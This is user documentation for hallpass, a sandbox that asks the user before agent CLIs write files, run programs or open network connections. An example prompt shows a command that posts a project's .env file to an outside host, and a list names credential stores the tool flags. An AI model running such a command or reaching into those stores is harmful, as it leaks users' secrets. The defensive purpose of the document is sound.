# Usage

Run a command, an agent CLI for example, in the sandbox from your project directory:

```console
hallpass -- copilot      # no command: your $SHELL
```

The command can write the project without asking; any other write, and any program outside the common ones, pauses it and asks you. `hallpass policy` prints the rules a run with the same flags would get, and Ctrl-] in a session shows the current ones. Every flag is in the [CLI reference](reference.md).

## Default policy

By default, only `~/.config/hallpass`, the hallpass binary itself and the session sockets' directory (`$XDG_RUNTIME_DIR/hallpass`) are denied (the sandbox must not change what hallpass runs next time, even when the binary sits in the project, nor tamper with the sessions); the project, a private `$TMPDIR` for the session (removed at exit if empty) and the usual `/dev` nodes are writable; anything else is asked, including the shared `/tmp`, `/var/tmp` and `/dev/shm` (answer "always" to allow them). `hallpass policy` prints the resulting rules.

`--allow-path` adds a folder writable without asking, `--deny-path` one always denied, and `--ask-path` carves an exception out of what is allowed: with `--allow-path ~/.config --ask-path ~/.config/gh`, writes to `~/.config/gh` are asked about and the rest of `~/.config` is not. The most specific rule decides, an ask wins over an allow as specific, and a deny wins over both. This works in both modes: in strict mode, the kernel denies a write under an asked folder unless you answer.

Writes to known secret stores (`~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.azure`, `~/.config/gh`, `~/.kube`, `~/.docker`, `~/.netrc`, `~/.git-credentials`) are asked about like any other write, but the prompt is flagged in red (for example "SSH keys — secret store"), so allowing one is a deliberate choice rather than a reflex. They are not denied outright: writing them is sometimes legitimate (`ssh-keygen`, `gh auth login`, `aws configure`), and a silent deny would hide the attempt instead of surfacing it.

When the sandbox starts, hallpass prints one line on stderr with the mode, the session number (hallpass's pid, as `hallpass answer` and `hallpass web` show it) and where to answer:

```
hallpass: sandbox started (lite, session 1234). Ctrl-] for the menu, then w for the web UI; 'hallpass web' in another terminal for all sessions.
```

Press Ctrl-] inside a session to see its current rules, including answers given so far; `w` opens the session's [web UI](../answers/web.md#from-a-session), any other key closes the overlay.

On a terminal, the window title starts with `[hallpass]` until the session ends: every title the program sets gets the prefix, and the command running in the foreground, if it is not a shell, is appended (`[hallpass] ~/src — vim main.go`), since the terminal itself only sees hallpass. At exit, hallpass restores the previous title in terminals that support the title stack (xterm, VTE-based ones such as GNOME Terminal); elsewhere, the title stays until your shell sets a new one.

With `--no-implicit`, nothing is writable unless you `--allow-path` it: not the project, not a `$TMPDIR`, not even `/dev/null`. The session's own terminal stays off too, unless you also pass `--allow-tty` (its `/dev/pts/N` is only known once hallpass starts). Only the command and the `--allow-exec` programs run without asking: the groups allowed implicitly are off. See [use cases](use-cases.md) for examples.

## Programs

With `exec` in `--mediate` (the default), hallpass asks before a sandboxed process runs a program no rule allows, like a write:

```
 hallpass: sh (pid 4242) wants to exec
 /usr/bin/curl
 by: sh -c curl -d @.env https://example.com ← bash
 [t] and [a] allow: /usr/bin/curl
```

A program that belongs to a group of programs is offered with its group too:

```
 [g] allows the group: @build (make, aarch64-linux-gnu-gcc-15: 2 programs)
 [o] allow once  [t] for 5m0s  [a] always  [g] group  [d] deny  [n] never  [Esc] dismiss
```

<video src="../../assets/demos/exec.mp4" poster="../../assets/demos/exec.png" controls muted playsinline aria-label="a shell under hallpass --group=@build=make,cc: ls and grep run without a question, make is asked with its group offered and the group allowed, curl is asked and denied, a program built in the project is asked and allowed always, Ctrl-] shows the groups by name and count under Run"></video>

*The implicit groups let the common tools run without a question. `make` is asked about with its group, `@build` (defined with `--group`), offered; `curl` and a program built in the project are asked about; "always" allows that program only.*

Allowed without asking: the command given to hallpass (as found in `$PATH`, symlinks resolved), any number of times, the groups `@shells`, `@coreutils`, `@search` and `@git` (but for `--no-implicit`), and what `--allow-exec` names. A program is its resolved path: `--allow-exec=make` allows `/usr/bin/make`, not every program named `make`; answers ("once", "this session", "always", "never") cover that program only. `--allow-exec=DIR/**` allows every program below `DIR`. Denied programs fail with `EACCES` ("Permission denied", exit code 126 in a shell). A script runs only if its `#!` interpreter may run too: the kernel runs both.

Groups name common sets of programs, resolved to exact paths when the session starts (the programs found in `$PATH`, symlinks followed): `--allow-exec=@shells,@coreutils` allows them all, and a prompt about a program of a group offers "group", which allows the rest of the group for the session. `hallpass policy` and Ctrl-] list a group by name and count; `hallpass policy --allow-exec=@git` shows what it has here.

| Group | Programs |
|---|---|
| `@shells` | `sh`, `bash`, `dash`, `zsh`, `ash`, `env` |
| `@coreutils` | the GNU coreutils programs (`cat`, `ls`, `cp`, `mv`, `rm`, `mkdir`, `chmod`, `head`, `sort`, ...) |
| `@search` | `grep`, `rg`, `find`, `xargs`, `sed`, `awk`, `diff`, `file`, `less`, `which`, `jq`, ... |
| `@git` | `git` and its helpers in `git-core` |
| `@busybox` | `busybox` and its applets installed as hard links (container images) |

Groups are yours to change: `--group=@tools=make,cc,/opt/tools/**` defines `@tools` (programs as in `--allow-exec`, without groups), and `--group` with the name of a built-in group replaces it (`--group=@search=grep,rg`). The groups you define are offered in prompts and allowed by `--allow-exec=@tools` like the built-in ones. A [HallpassPolicy](../kubernetes/policies.md) does the same with `groups`. Names are `@`, a lowercase letter, then lowercase letters, digits or `-`.

Exec rules decide which programs start, not what they do once running, so they are a speed bump against an agent reaching for an unexpected tool, not a boundary:

- **Interpreters run any code**: an allowed `python3`, `node` or `bash` runs whatever `-c`/`-e` code or script it is given, and `ld.so /path/to/program` runs a program without executing it. Allowing an interpreter or the dynamic loader allows everything it can do. Rules on the arguments are planned.
- **Copies**: a program copied (or downloaded) to a path an allow covers runs. The project directory is writable, not executable: a program built or copied there is asked about.
- **Multi-call binaries**: when several commands are one binary (busybox, uutils coreutils), they are told apart by path. Commands installed as hard links or copies have paths of their own; commands installed as symlinks all resolve to the one binary, so allowing one of them, or its group, allows all: `busybox` with symlinked applets runs every applet once any is allowed. Telling them apart needs `argv[0]`, which rules do not look at yet.
- **File descriptors**: a program run from a file descriptor (`execveat` with `AT_EMPTY_PATH`, for example a `memfd`) is asked about as an unknown path in lite mode ("once" only). Strict mode matches the rules on the file the descriptor is open on, without asking, and always denies a `memfd`, which has no path.
- **binfmt_misc**: lite mode checks a program and its `#!` interpreters, not the handlers the kernel registers for other formats (qemu, Wine): they run. Strict mode checks them in the kernel, but they are never asked about: a handler runs only if a rule allows it (`--allow-exec=/usr/bin/qemu-aarch64-static`), and the program is denied otherwise.

## Network (experimental)

With `--mediate=files,exec,network`, hallpass also asks before a sandboxed process connects or sends to a destination:

```
 hallpass: curl (pid 4242) wants to connect to
 140.82.112.3:443
 (tcp)
 by: curl https://140.82.112.3 ← bash
 [t] and [a] allow: 140.82.112.3:443
```

Destinations are shown as addresses, not names: `1.2.3.4:443` with the protocol (`tcp`, `udp`) below, `[2001:db8::1]:53`, `unix /run/user/1000/bus`, `unix @name` (abstract). Answers cover that destination only, with any protocol. One kind is allowed without asking: a loopback or unix listener started inside the sandbox, such as a test server the agent runs; with `--no-implicit` it is asked, with the note "listener started inside the sandbox".

`--allow-net`, `--deny-net` and `--ask-net` take:

| Syntax | Covers |
|---|---|
| `all` | every destination, unix sockets included |
| `[tcp:\|udp:]ADDR[/N][:PORT[-PORT]]` | addresses, an optional protocol and ports; `*` for any address, IPv6 in brackets: `tcp:*:443`, `10.0.0.0/8`, `udp:[::1]:53` |
| `unix:/path`, `unix:/dir/**` | a unix socket file, or every one under `/dir` |
| `unix:@name`, `unix:@prefix*` | an abstract name, or every one starting with `prefix` |

For example, `hallpass --mediate=files,exec,network --allow-net=tcp:*:443 --deny-net=169.254.169.254 -- copilot` lets the agent reach HTTPS servers, never the cloud metadata service, and asks about the rest.

`--ask-net` carves an exception out of what `--allow-net` allows: with `--allow-net=10.0.0.0/8 --ask-net=tcp:10.0.0.1:22`, SSH to `10.0.0.1` is asked about and the rest of the subnet is not. The most specific rule decides, an ask wins over an allow as specific, and `--deny-net` wins over both. This works in both modes: in strict mode, the kernel denies the asked destination unless you answer "once" (or a more specific `--allow-net` allows it).

Some destinations are always denied, even with `--allow-net=all`, because they could answer for the sandbox: the session sockets (in `$XDG_RUNTIME_DIR/hallpass/`) and the ports of the running [`hallpass web`](../answers/web.md) UIs, including one started after the session. The Ctrl-] menu and `hallpass policy` list them as "(hallpass sessions)" and "(hallpass web UI)"; they cannot be removed. Writes to `$XDG_RUNTIME_DIR/hallpass/` are always denied too, with or without network mediation.

## Background processes

Processes the command leaves behind (daemons, `nohup`, double forks) stay under hallpass: it becomes their subreaper, so their writes are asked about like any other.

By default (`--wait=main`), hallpass exits with the command. The processes left behind keep the seccomp filter but lose their supervisor: their mediated syscalls then fail (fail closed). With `--wait=all`, hallpass keeps supervising, asking and logging until the last of them exits; the prompts keep working in the terminal. Press Ctrl-] then `s`, or send SIGTERM, to stop waiting early. `--wait=all` needs Linux 5.9.

## Unreadable paths

Sometimes hallpass cannot read the path a syscall passes, for example when the pointer is invalid. In lite mode, hallpass asks with a red "Unknown path" warning, and only offers "once", "deny" and "never" ("never" denies every unknown path for the rest of the session): allowing such a write skips every rule, so it is never granted for good. In strict mode, the kernel's rules decide on the real file, without asking.

## Signals during a prompt

While a prompt is pending, the paused thread only reacts to fatal signals (Linux 5.19 and later): a Ctrl-C or other handled signal is delivered once you answer, instead of restarting the syscall and asking again.

## Asking in advance

A program that knows it will write a folder later, run a program or reach a network destination, for example an agent about to start a long task while you are still there, can ask for it beforehand, so that you are not prompted while you are away. The [`hallpass-request`](agents.md#hallpass-request) helper does it with a plain command line and exit codes (`hallpass-request write '/home/me/.cache/build/**' --for 30m --reason 'cache object files'`); underneath, and for scripts that do without it, it runs a magic path that names what it wants:

```console
exec '/proc/self/hallpass/request?op=write&path=/home/me/.cache/build/**&for=30m&reason=cache+object+files'
```

The request shows a card in every client (terminal, desktop notification, `hallpass answer`, [web UI](../answers/web.md), Headlamp), with the folder, how long and the program's reason. The reason is the program's own words: hallpass shows it marked as unverified, never as a fact.

```
 hallpass: dash (pid 4242) asks in advance to write
 /home/me/.cache/build/**
 by: sh -c "exec '/proc/self/hallpass/request?op=write&path=/home/me/.cache/bu…
 reason given by the program (unverified): "cache object files"
 [g] grant for 30m  [d] deny  [Esc] dismiss
```

`grant` adds the same rule as the matching allow flag (`--allow-path`, `--allow-exec`, `--allow-net`), with an expiry, in the rule set `advance`: Ctrl-] lists it, the web UI can remove it (or the whole set), and in [strict mode](../how-it-works/strict.md) the kernel enforces it like the other rules. The call blocks until you answer. For a program the sandbox may write without asking (or a folder of programs where it may), the card warns you: a grant would let it run anything it writes there.

The query string:

| Key | Value |
|---|---|
| `op` | `write` (every file operation hallpass mediates), `exec` (running a program) or `connect` (connecting and sending to network destinations) |
| `path` | `write`, `exec`: an absolute path; ending in `/**`, the folder and everything below it. No other globs (`*`, `?`, `[`). Percent-encode `&`, `;`, `%` and `+` in it (`%26`...) |
| `dest` | `connect`: destinations as [`--allow-net`](#network) takes them, for example `tcp:192.0.2.0/24:443`, `[2001:db8::1]:53`, `unix:/run/x.sock`, `unix:@name`; addresses only, not host names, and not `all` |
| `for` | optional: a duration (`90s`, `10m`, `2h`); without it, the rest of the session |
| `reason` | optional: why, shown to you as the program's words; `+` or `%20` for spaces |

`/proc/self/hallpass/check?...`, with the same keys, asks whether a request would be needed, without asking you.

`/proc/self/hallpass/release?op=...&path=...` (or `dest=`), without `for` and `reason`, gives a grant back before it expires, without asking you: it removes the rules granted to this session's requests for exactly that target (same `op`, same path and `/**`, same destinations). It never removes another rule: not your flags, policy file, answers to other prompts or edits. The terminal prints a notice, and `--log` a line with decision `release`.

hallpass never runs anything: the `execve` always fails, and its error number is the answer. A shell prints it (exit code 126, or 127 when there is no hallpass; dash also exits 127 for `ENAMETOOLONG`):

| errno | Message | Meaning |
|---|---|---|
| `EEXIST` | File exists | already allowed for that long: nobody was asked |
| `EALREADY` | Operation already in progress | granted |
| `EPERM` | Operation not permitted | denied or dismissed, or a rule denies part of it |
| `ETIMEDOUT` | Connection timed out | nobody answered within `--timeout` |
| `ENOMSG` | No message of desired type | (check) a request would ask you |
| `EINVAL`, `ENAMETOOLONG` | Invalid argument, File name too long | malformed request |
| `ENOSYS` | Function not implemented | the operation's category (files, exec, network) is not mediated (`--mediate`, or a Kubernetes policy's `mediate`): nothing would enforce a grant, so nobody is asked |
| `ENOENT` | No such file or directory | no hallpass: the path does not exist |
| `ECANCELED` | Operation canceled | (release) given back |
| `ESRCH` | No such process | (release) no grant of a request for exactly that target |

With `--prompt=deny`, requests are denied (`EPERM`) without a card; with `--prompt=allow`, they are granted. A request is covered (`EEXIST`) when the rules already allow the whole path, or every destination, for the duration asked, so asking again right after a grant does not prompt; a deny or ask rule inside it takes part of it away, and then it asks.

Agents learn it from a skill or their instructions file: see [Agents](agents.md#tell-the-agent), which uses `hallpass-request`. Where the helper is not installed, an instructions file (`AGENTS.md`, `.github/copilot-instructions.md`, `CLAUDE.md`...) can teach the magic path itself, for example:

````markdown
## Sandbox

You run under hallpass, which asks the user before writes outside the
project. Before a long task that writes elsewhere, ask for the folder
once, while the user is there:

```sh
sh -c "exec '/proc/self/hallpass/request?op=write&path=$HOME/.cache/build/**&for=1h&reason=build+cache+for+the+test+run'"
```

The command always fails: read its message. "Operation already in
progress" (granted) or "File exists" (already allowed): go ahead.
"Operation not permitted" or "Connection timed out": do not write
there, tell the user. "No such file or directory": no hallpass.
Ask only for what the task needs, and say why in the reason.
````

<video src="../../assets/demos/advance-grant.mp4" poster="../../assets/demos/advance-grant.png" controls muted playsinline aria-label="a script checks, then asks in advance to write ~/.cache/build for 30 minutes, with its reason marked unverified; after one grant, its writes there go through without prompts, and Ctrl-] shows the rule with its expiry"></video>

*One question before the task, none during it: the grant is a rule with an expiry.*

## Using hallpass with agent CLIs

Wrap the top-level command; there is nothing to configure in the agent (to let it [ask in advance](agents.md), give it the `hallpass-request` helper):

```console
hallpass -- copilot
hallpass -- claude
hallpass -C ~/src/app -- codex
```

Agents keep their own state (sessions, logs, caches) outside the project. For copilot that is `~/.copilot` and `~/.cache/copilot`:

```console
hallpass --allow-path ~/.copilot --allow-path ~/.cache/copilot -- copilot
```

The `-allow` flags are optional: without them, hallpass asks you when copilot writes there, which is a good way to see what an agent touches. Allowing all of `~/.copilot` does let the agent change its own config or hooks, which would apply to later runs without hallpass.

Things to know:

- **Full-screen TUIs**: hallpass draws its question over the agent's screen and repaints it afterwards; the agent's terminal is never resized. This also works over ssh.
- **Agents' own sandboxes**: some agents run commands inside their own bubblewrap sandbox (for example Codex), which creates user and mount namespaces. hallpass lite mode blocks new namespaces by default, because inside a private mount namespace a process could bind-mount a protected directory somewhere that looks harmless. The agent's own sandbox will then fail to start or fall back; disable it in the agent, pass `--allow-userns` and accept the weaker lite-mode guarantees, or use strict mode, which allows namespaces because it checks real inodes.
- **Agents that use seccomp user notification themselves** cannot install their own listener under hallpass: the kernel allows only one listener per filter chain and returns `EBUSY`. This fails closed.
- **sudo** does not work inside the sandbox (`no_new_privs`), in either mode, by design.

## Over ssh

hallpass draws its prompt over the terminal, so it works over ssh like any other full-screen program. Without a terminal (for example a non-interactive session, or when the agent fully owns the screen), use a desktop prompt (`--prompt=desktop`) or answer from another terminal:

```console
hallpass --prompt=answer -- copilot     # in one terminal
hallpass answer                      # in another, to see prompts and reply
```

`hallpass answer` connects to the running session's socket, shows each pending request (path, the `by:` command line and its parents) and lets you give the same [answers](../answers/index.md) as the terminal. Every client answers the same requests: the first answer wins, and the others take their prompt down, the terminal overlay included.

`hallpass answer` is mainly a testing and debugging aid, and a fallback for the headless case above; the terminal overlay is the normal way to answer. The socket serves a gRPC API (`api/session/v1/session.proto`, see [Write a client](../answers/api.md)) to follow and answer the session. It only accepts a client of the same user that is not itself sandboxed (it rejects any peer running under a seccomp filter), so the sandbox cannot answer its own prompts through it.

The [web UI](../answers/web.md) (`hallpass web`, experimental) does the same in a browser, for every session of the user.

See [Limitations](../how-it-works/limitations.md) for what hallpass does not cover.
